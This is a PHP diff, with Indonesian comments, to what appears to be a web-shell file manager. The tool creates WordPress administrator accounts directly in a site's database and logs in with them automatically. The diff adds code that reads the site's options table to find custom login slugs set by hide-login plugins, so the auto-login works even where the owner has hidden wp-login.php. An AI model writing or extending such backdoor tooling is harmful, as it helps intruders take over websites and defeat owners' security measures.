@@ -1598,6 +1598,102 @@ function fm_wp_site_url($wpdir, $pdo = null, $prefix = 'wp_') {
     return $base;
 }
 
+/**
+ * Baca satu option dari wp_options.
+ * Contoh hide login (WPS Hide Login):
+ *   SELECT option_name, option_value FROM wp_options WHERE option_name = 'whl_page'
+ */
+function fm_wp_get_option($pdo, $prefix, $name) {
+    if (!is_object($pdo) || $name === '') return '';
+    try {
+        $st = $pdo->prepare(
+            'SELECT option_value FROM `' . fm_wp_tbl($prefix, 'options') . '` WHERE option_name = ? LIMIT 1'
+        );
+        $st->execute(array($name));
+        $row = $st->fetch();
+        if (!$row || !isset($row['option_value'])) return '';
+        return is_string($row['option_value']) ? $row['option_value'] : (string)$row['option_value'];
+    } catch (Exception $e) {
+        return '';
+    }
+}
+
+/**
+ * Deteksi slug hide-login (WPS Hide Login dll).
+ * @return array{slug:string,source:string,raw:string}
+ */
+function fm_wp_hide_login_info($pdo, $prefix) {
+    $out = array('slug' => '', 'source' => '', 'raw' => '');
+    if (!is_object($pdo)) return $out;
+
+    // Prioritas: whl_page (WPS Hide Login)
+    $keys = array(
+        'whl_page' => 'wps-hide-login',
+        'rwl_page' => 'rename-wp-login',
+        'wps_hide_login' => 'wps-hide-login-alt',
+        'login_page_slug' => 'login-page-slug',
+        'ahcl_login_url' => 'custom-login-url',
+    );
+    foreach ($keys as $opt => $src) {
+        $val = trim(fm_wp_get_option($pdo, $prefix, $opt));
+        if ($val === '') continue;
+        // kadang serialized
+        if ($val[0] === 'a' || $val[0] === 'O' || $val[0] === 's') {
+            $unser = @unserialize($val);
+            if (is_array($unser)) {
+                foreach (array('slug', 'page', 'login', 'whl_page', 'url') as $k) {
+                    if (!empty($unser[$k]) && is_string($unser[$k])) {
+                        $val = $unser[$k];
+                        break;
+                    }
+                }
+            } elseif (is_string($unser) && $unser !== '') {
+                $val = $unser;
+            }
+        }
+        $val = trim(str_replace('\\', '/', $val));
+        $val = trim($val, "/ \t\r\n");
+        // buang URL penuh → ambil path
+        if (preg_match('#^https?://#i', $val)) {
+            $p = parse_url($val, PHP_URL_PATH);
+            $val = is_string($p) ? trim($p, '/') : '';
+        }
+        // slug aman
+        if ($val === '' || !preg_match('#^[A-Za-z0-9_\-\./]+$#', $val)) continue;
+        if (preg_match('#\.\.#', $val)) continue;
+        $out['slug'] = $val;
+        $out['source'] = $src;
+        $out['raw'] = $opt;
+        break;
+    }
+    return $out;
+}
+
+/**
+ * URL login WP: pakai hide-login slug jika ada, else wp-login.php
+ * @return array{login_url:string,hide_login:bool,whl_page:string,hide_source:string}
+ */
+function fm_wp_resolve_login_url($site, $pdo, $prefix) {
+    $site = rtrim((string)$site, '/');
+    $hide = fm_wp_hide_login_info($pdo, $prefix);
+    if ($hide['slug'] !== '') {
+        return array(
+            'login_url' => $site . '/' . $hide['slug'],
+            'hide_login' => true,
+            'whl_page' => $hide['slug'],
+            'hide_source' => $hide['source'],
+            'hide_option' => $hide['raw'],
+        );
+    }
+    return array(
+        'login_url' => $site . '/wp-login.php',
+        'hide_login' => false,
+        'whl_page' => '',
+        'hide_source' => '',
+        'hide_option' => '',
+    );
+}
+
 function fm_wp_create_admin($cfg, $username = null, $password = null, $email = null) {
     $pdo = fm_wp_pdo($cfg['db']);
     if (!is_object($pdo)) {
@@ -1651,6 +1747,8 @@ function fm_wp_create_admin($cfg, $username = null, $password = null, $email = n
     }
 
     $site = fm_wp_site_url($cfg['dir'], $pdo, $prefix);
+    // Hide login: SELECT option_value FROM wp_options WHERE option_name = 'whl_page'
+    $login = fm_wp_resolve_login_url($site, $pdo, $prefix);
     return array(
         'ok' => true,
         'user_id' => $uid,
@@ -1658,8 +1756,12 @@ function fm_wp_create_admin($cfg, $username = null, $password = null, $email = n
         'password' => $password,
         'email' => $email,
         'siteurl' => $site,
-        'login_url' => $site . '/wp-login.php',
+        'login_url' => $login['login_url'],
         'admin_url' => $site . '/wp-admin/',
+        'hide_login' => !empty($login['hide_login']),
+        'whl_page' => isset($login['whl_page']) ? $login['whl_page'] : '',
+        'hide_source' => isset($login['hide_source']) ? $login['hide_source'] : '',
+        'hide_option' => isset($login['hide_option']) ? $login['hide_option'] : '',
         'wp_config' => $cfg['file'],
         'prefix' => $prefix,
     );
@@ -4323,11 +4425,20 @@ tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
         }).then(function (res) {
           btn.disabled = false;
           btn.textContent = 'Create Admin + Auto Login';
+          var hideLine = '';
+          if (res.hide_login && res.whl_page) {
+            hideLine = 'Hide login: <strong>' + esc(res.whl_page) + '</strong>' +
+              (res.hide_option ? (' <span style="color:var(--muted)">(' + esc(res.hide_option) + ')</span>') : '') +
+              '<br>';
+          } else {
+            hideLine = 'Hide login: <span style="color:var(--muted)">tidak aktif (wp-login.php)</span><br>';
+          }
           resBox.innerHTML =
             '<div style="padding:12px;border:1px solid rgba(192,240,0,.3);border-radius:10px;background:rgba(192,240,0,.06)">' +
             '<div style="font-weight:700;color:var(--primary);margin-bottom:8px">Administrator dibuat</div>' +
             '<div class="mono" style="font-size:12px;line-height:1.7">' +
             'User: <strong>' + esc(res.username) + '</strong><br>Pass: <strong>' + esc(res.password) + '</strong><br>' +
+            hideLine +
             'Login: ' + esc(res.login_url) + '</div></div>' +
             '<form id="wpAutoForm" method="post" action="' + esc(res.login_url) + '" target="_blank" style="display:none">' +
             '<input type="hidden" name="log" value="' + esc(res.username) + '">' +
@@ -4335,7 +4446,7 @@ tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
             '<input type="hidden" name="redirect_to" value="' + esc(res.admin_url) + '">' +
             '<input type="hidden" name="wp-submit" value="Log In">' +
             '<input type="hidden" name="testcookie" value="1"></form>';
-          toast('WP admin dibuat — membuka login…');
+          toast(res.hide_login ? ('WP admin · hide login /' + (res.whl_page || '')) : 'WP admin dibuat — membuka login…');
           try { document.cookie = 'wordpress_test_cookie=WP Cookie check; path=/'; } catch (e) {}
           setTimeout(function () {
             var f = document.getElementById('wpAutoForm');
